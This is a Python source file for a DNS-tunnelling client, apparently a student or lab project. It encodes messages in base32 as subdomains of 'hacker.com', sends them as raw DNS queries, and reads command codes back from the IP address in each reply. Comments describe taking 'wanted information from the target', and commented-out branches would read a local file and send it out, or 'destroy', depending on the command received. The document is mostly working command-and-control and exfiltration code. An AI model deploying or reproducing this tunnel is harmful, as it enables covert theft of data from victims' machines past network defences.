import socket
import struct
from scapy.all import IP, Raw, raw
import base64

SERVER_IP = "127.0.0.1"  # IP of the server
PORT = 53  # outside testing, will be 53
DOMAIN_NAME = "hacker.com"
DNS_SIZE = 1024
PATH = r"C:\tunneling\tunnel.txt"
def run_client():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    # sock.bind(("127.0.0.1", 0))
    # _, my_port = sock.getsockname()

    while True:
        message = input("send message2:")  # take wanted information from the target
        send_message(message, sock)#, my_port)

        dns_data, addr = sock.recvfrom(DNS_SIZE)
        # print("ive recieved response")
        # dns_data = raw_data[28:]

        ip_command = parse_dns_response(dns_data)
        print(f"the command related is {ip_command}")
        # payload = ""
        # if ip_command == "1.1.1.1":
        #     with open(PATH, 'r') as file:
        #         payload = file.read()
        # elif ip_command == "2.2.2.2":
        #     print("destroy:)")
        # send_message(payload, addr)

def send_message(message, sock):#, port) :
    msg_b32 = base64.b32encode(message.encode('utf-8'))
    query_domain = f"{msg_b32.decode()}.{DOMAIN_NAME}"
    dns_header = build_dns_query(query_domain)
    # sock.sendto(payload, (SERVER_IP, PORT))

    # udp_header = build_udp_header(dns_header, port)
    # packet = IP(dst=SERVER_IP) / Raw(load=udp_header) / Raw(load=dns_header)

    print((SERVER_IP, PORT))
    sock.sendto(dns_header, (SERVER_IP, PORT))


def build_dns_query(domain):
    # DNS Header
    transaction_id = 12345  # A random transaction ID (check the id is available)
    flags = 0x0100  # Standard query (Recursion Desired)
    questions = 1
    answer_rrs = 0
    authority_rrs = 0
    additional_rrs = 0

    # Query Section for "A" record
    qname = encode_domain_name(domain)
    qtype = 1  # Type A (IPv4 address)
    qclass = 1  # Class IN (Internet)

    # Packing the DNS query
    query = struct.pack("!HHHHHH", transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs)
    query += qname
    query += struct.pack("!HH", qtype, qclass)

    return query

def encode_domain_name(domain):
    labels = domain.split('.')
    encoded_name = b""
    for label in labels:
        encoded_name += struct.pack("B", len(label)) + label.encode()
    encoded_name += b"\x00"  # Null byte to end the domain name
    return encoded_name


def parse_dns_response(response):
    """
    Parses a raw DNS response packet.
    """
    index = response.find(b'\xc0')  # Compressed name pointer (start of answer section)
    if index != -1:
        index += 12

        ip_address = socket.inet_ntoa(response[index:index + 4])  # Convert 4 bytes to IP
        return ip_address

# def build_udp_header(dns_query, port):
#     src_port = port
#     dst_port = PORT
#     length = 8 + len(dns_query)
#     checksum = 0
#     udp_header = struct.pack("!HHHH", src_port, dst_port, length, checksum)
#     return udp_header



def main():
    run_client()

if __name__ == '__main__':
    main()
